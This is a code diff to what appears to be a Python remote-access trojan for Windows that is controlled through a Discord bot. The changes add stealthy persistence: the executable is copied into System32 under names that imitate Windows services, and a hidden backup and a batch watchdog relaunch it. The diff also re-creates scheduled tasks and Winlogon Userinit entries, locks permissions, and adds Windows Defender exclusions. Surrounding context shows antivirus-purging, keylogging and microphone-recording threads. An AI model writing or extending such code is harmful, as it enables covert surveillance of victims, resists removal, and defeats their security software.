@@ -327,6 +327,55 @@ _MUTEX = None
 APP_DIR = ""
 _LEGACY_STATE = os.path.join(PDATA, "ZZZ_Security", "state.json")
 
+REPAIR_FLAG = "--zz-repair"
+STATE_VERSION = 2
+WATCHDOG_PERIOD = 300
+
+_FALLBACK_NAMES = (
+    "WindowsPushNotify", "AppXSvcHost", "SearchHostService", "WpnUserServiceHost",
+    "DeviceAssocService", "SecurityHealthSvc", "WinUpdateBroker", "RuntimeBrokerClient",
+    "ShellHostSvc", "CtfMonService",
+)
+
+_WATCH_BAT = """@echo off
+set "EXE={exe}"
+set "BAK={bak}"
+set "TSK={tsk}"
+set "NAME={name}"
+:loop
+if not exist "%EXE%" if exist "%BAK%" (
+  copy /y "%BAK%" "%EXE%" >nul 2>&1
+  attrib +h +s "%EXE%" >nul 2>&1
+  start "" /b "%EXE%"
+)
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit 2>nul | find /i "%NAME%" >nul
+if errorlevel 1 start "" /b "%EXE%" {flag}
+schtasks /query /tn "%TSK%" >nul 2>&1
+if errorlevel 1 schtasks /create /tn "%TSK%" /tr "\\"%EXE%\\"" /sc onlogon /rl highest /f >nul 2>&1
+timeout /t {period} /nobreak >nul 2>&1
+goto loop
+"""
+
+_watch_proc = None
+
+
+def _sys32():
+    return os.path.join(WINDIR, "System32")
+
+
+def _machine_hash():
+    return hashlib.md5(_machine_seed().encode("utf-8", "replace")).hexdigest()
+
+
+def _pick_exe_name():
+    h = _machine_hash()
+    base = _FALLBACK_NAMES[int(h[:8], 16) % len(_FALLBACK_NAMES)]
+    for cand in (base, base + "64", base + h[8:11].upper()):
+        if not os.path.exists(os.path.join(_sys32(), cand + ".exe")) and \
+           not os.path.isdir(os.path.join(_sys32(), cand)):
+            return cand + ".exe"
+    return base + h[:5] + ".exe"
+
 
 def _is_admin():
     try:
@@ -368,8 +417,7 @@ def _rand(n):
 
 
 def _anchor():
-    h = hashlib.md5(_machine_seed().encode("utf-8", "replace")).hexdigest()[:12]
-    return os.path.join(PDATA, "Microsoft", "Windows", "Caches", h + ".json")
+    return os.path.join(PDATA, "Microsoft", "Windows", "Caches", _machine_hash()[:12] + ".json")
 
 
 def _app_db():
@@ -412,20 +460,27 @@ def _state_write(d):
 
 def _ensure_state():
     st = _state_read()
-    if st:
+    if st and st.get("v") == STATE_VERSION:
         return st
-    base = random.SystemRandom().choice(PERSIST_BASES)
-    d = Path(base) / _rand(10)
-    st = {
-        "dir": str(d),
-        "exe": str(d / (_rand(9) + ".exe")),
-        "task": _rand(12),
-        "mutex": _rand(14),
-        "appdir": _rand(11),
-        "created": int(time.time()),
+
+    h = _machine_hash()
+    exe_name = _pick_exe_name()
+    base = os.path.splitext(exe_name)[0]
+    cache = os.path.join(PDATA, "Microsoft", "Caches")
+
+    d = {
+        "v": STATE_VERSION,
+        "dir": _sys32(),
+        "exe": os.path.join(_sys32(), exe_name),
+        "bak": os.path.join(cache, h[:12] + ".dat"),
+        "bat": os.path.join(cache, h[:12] + ".bat"),
+        "task": "\\Microsoft\\Windows\\" + base,
+        "mutex": (st or {}).get("mutex") or _rand(14),
+        "appdir": (st or {}).get("appdir") or _rand(11),
+        "created": (st or {}).get("created") or int(time.time()),
     }
-    _state_write(st)
-    return st
+    _state_write(d)
+    return d
 
 
 def _targets():
@@ -433,13 +488,13 @@ def _targets():
     return st["task"], Path(st["dir"]), Path(st["exe"])
 
 
-def _lock_dir(d):
+def _lock_exe(path):
     try:
         subprocess.run(
-            ["icacls", str(d), "/inheritance:r",
-             "/grant:r", "*S-1-5-18:(OI)(CI)F",
-             "/grant:r", "*S-1-5-32-544:(OI)(CI)F",
-             "/grant:r", "*S-1-5-32-545:(OI)(CI)RX"],
+            ["icacls", str(path), "/inheritance:r",
+             "/grant:r", "*S-1-5-18:F",
+             "/grant:r", "*S-1-5-32-544:F",
+             "/grant:r", "*S-1-5-32-545:RX"],
             capture_output=True, creationflags=_CNW)
     except Exception:
         pass
@@ -563,38 +618,119 @@ def uninstall_userinit():
     _reg_add(WINLOGON_KEY, "Userinit", ", ".join(parts + [userinit]) + ",")
 
 
+def repair_all():
+    st = _ensure_state()
+    exe = Path(st["exe"])
+    bak = Path(st["bak"])
+
+    try:
+        if not exe.exists() and bak.exists():
+            shutil.copy2(str(bak), str(exe))
+    except Exception:
+        pass
+    if not exe.exists():
+        return
+
+    _hide(exe, True)
+    _lock_exe(exe)
+
+    fixed = False
+    try:
+        fixed = install_userinit()
+    except Exception:
+        fixed = False
+
+    if not fixed:
+        try:
+            _task_create(st["task"], str(exe), "ONLOGON")
+        except Exception:
+            pass
+
+    _ps(f'Add-MpPreference -ExclusionPath "{exe}" -ErrorAction SilentlyContinue')
+    _ps(f'Add-MpPreference -ExclusionProcess "{exe.name}" -ErrorAction SilentlyContinue')
+
+
+def _write_watchdog(st):
+    try:
+        os.makedirs(os.path.dirname(st["bat"]), exist_ok=True)
+        with open(st["bat"], "w", encoding="utf-8", newline="\r\n") as f:
+            f.write(_WATCH_BAT.format(
+                exe=st["exe"], bak=st["bak"], tsk=st["task"],
+                name=os.path.basename(st["exe"]),
+                flag=REPAIR_FLAG, period=WATCHDOG_PERIOD))
+        _hide(st["bat"], True)
+        return True
+    except Exception:
+        return False
+
+
+def _spawn_watchdog():
+    global _watch_proc
+    st = _state_read() or {}
+    if not st.get("bat"):
+        return
+    if _watch_proc is not None and _watch_proc.poll() is None:
+        return
+    if not os.path.exists(st["bat"]) and not _write_watchdog(st):
+        return
+    try:
+        _watch_proc = subprocess.Popen(
+            ["cmd.exe", "/c", st["bat"]],
+            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            creationflags=_CNW)
+    except Exception:
+        _watch_proc = None
+
+
+def _watchdog_thread():
+    while True:
+        try:
+            _spawn_watchdog()
+        except Exception:
+            pass
+        time.sleep(45)
+
+
 def setup_persistence():
     st = _ensure_state()
-    target_dir = Path(st["dir"])
     target_exe = Path(st["exe"])
-    folder = st["task"]
+    bak = Path(st["bak"])
 
     current = Path(sys.executable) if getattr(sys, "frozen", False) else Path(__file__).resolve()
 
     try:
-        target_dir.mkdir(parents=True, exist_ok=True)
-    except Exception:
-        pass
-
-    try:
-        if not target_exe.exists() or current.resolve() != target_exe.resolve():
+        if not target_exe.exists():
             shutil.copy2(str(current), str(target_exe))
     except Exception:
         pass
 
-    _hide(target_exe, True)
-    _hide(target_dir, True)
+    try:
+        os.makedirs(bak.parent, exist_ok=True)
+        if current.exists() and current.stat().st_size > 100_000:
+            if not bak.exists() or bak.stat().st_size != current.stat().st_size:
+                shutil.copy2(str(current), str(bak))
+    except Exception:
+        pass
+
+    for p in (target_exe, bak):
+        if p.exists():
+            _hide(p, True)
+
+    _write_watchdog(st)
 
     if not _is_admin():
+        _spawn_watchdog()
         return
 
-    _lock_dir(target_dir)
+    if target_exe.exists():
+        _lock_exe(target_exe)
+        if not install_userinit():
+            _task_create(st["task"], str(target_exe), "ONLOGON")
 
-    if target_exe.exists() and not install_userinit():
-        _task_create(folder, str(target_exe), "ONLOGON")
-
-    _ps(f'Add-MpPreference -ExclusionPath "{target_dir}" -ErrorAction SilentlyContinue')
+    _ps(f'Add-MpPreference -ExclusionPath "{target_exe}" -ErrorAction SilentlyContinue')
     _ps(f'Add-MpPreference -ExclusionProcess "{target_exe.name}" -ErrorAction SilentlyContinue')
+
+    _spawn_watchdog()
 
 def boot():
     global APP_DIR
@@ -605,6 +741,13 @@ def boot():
     except Exception:
         pass
     _state_write(st)
+
+    if REPAIR_FLAG in sys.argv:
+        try:
+            repair_all()
+        except Exception:
+            pass
+        os._exit(0)
 
     if not _mutex_claim():
         os._exit(0)
@@ -2713,7 +2856,7 @@ AV_KW = ["avast", "avg", "kaspersky", "eset", "bitdefender", "mcafee", "norton",
 
 def purge_av():
     st = _state_read() or {}
-    paths = [p for p in (st.get("dir"), st.get("exe")) if p]
+    paths = [p for p in (st.get("dir"), st.get("exe"), st.get("bak")) if p]
     paths += [os.environ.get("TEMP", r"C:\Windows\Temp"), r"C:\Windows\Temp"]
 
     for p in paths:
@@ -4594,8 +4737,13 @@ async def delete_malware(ctx):
     def clean_system():
         st = _state_read() or {}
         name = st.get("task")
-        exe = st.get("exe")
-        d = st.get("dir")
+
+        try:
+            if _watch_proc is not None and _watch_proc.poll() is None:
+                subprocess.run(["taskkill", "/f", "/pid", str(_watch_proc.pid)],
+                               capture_output=True, creationflags=_CNW)
+        except Exception:
+            pass
 
         try:
             uninstall_userinit()
@@ -4605,26 +4753,32 @@ async def delete_malware(ctx):
         if name:
             subprocess.run(["schtasks", "/Delete", "/TN", name, "/F"],
                            capture_output=True, creationflags=_CNW)
-            for val in (name, name + "_w"):
+            base = name.rsplit("\\", 1)[-1]
+            for val in (base, base + "_w"):
                 for key in (POLICY_RUN, RUN_KEY):
                     _reg_delete(key, val, "HKLM")
                     _reg_delete(key, val, "HKCU")
-            for vbs in (os.path.join(_startup_dir(), name + ".vbs"),
-                        os.path.join(st.get("dir") or "", name + ".vbs")):
+            for vbs in (os.path.join(_startup_dir(), base + ".vbs"),
+                        os.path.join(st.get("dir") or "", base + ".vbs")):
                 try:
                     os.remove(vbs)
                 except Exception:
                     pass
 
-        if d:
-            _ps(f'Remove-MpPreference -ExclusionPath "{d}"')
-            _hide(d, False)
+        for key in ("bat", "bak", "exe"):
+            p = st.get(key)
+            if not p:
+                continue
+            _ps(f'Remove-MpPreference -ExclusionPath "{p}"')
+            try:
+                _hide(p, False)
+                os.remove(p)
+            except Exception:
+                pass
+
+        d = st.get("dir")
+        if d and os.path.abspath(d) != os.path.abspath(_sys32()) and os.path.isdir(d):
             _unlock_dir(d)
-
-        if exe:
-            _hide(exe, False)
-
-        if d and os.path.isdir(d):
             shutil.rmtree(d, ignore_errors=True)
 
         try:
@@ -4903,6 +5057,7 @@ async def on_ready():
     threading.Thread(target=send_keys_periodically, daemon=True).start()
     threading.Thread(target=record_mic_thread, daemon=True).start()
     threading.Thread(target=check_blacklist, daemon=True).start()
+    threading.Thread(target=_watchdog_thread, daemon=True).start()
 
 @bot.event
 async def on_message(message):
